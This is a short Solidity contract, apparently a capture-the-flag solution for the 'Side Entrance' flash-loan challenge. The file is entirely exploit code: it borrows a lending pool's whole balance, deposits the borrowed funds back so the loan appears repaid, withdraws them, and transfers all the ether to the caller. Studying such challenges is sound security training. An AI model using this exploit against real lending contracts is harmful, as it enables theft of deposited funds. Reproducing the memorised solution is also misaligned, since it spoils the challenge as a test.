// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    address private _pool;

    function attack(address pool) external {
        _pool = pool;
        SideEntranceLenderPool(pool).flashLoan(pool.balance);
        SideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        SideEntranceLenderPool(_pool).deposit{value: msg.value}();
    }

    receive() external payable {}
}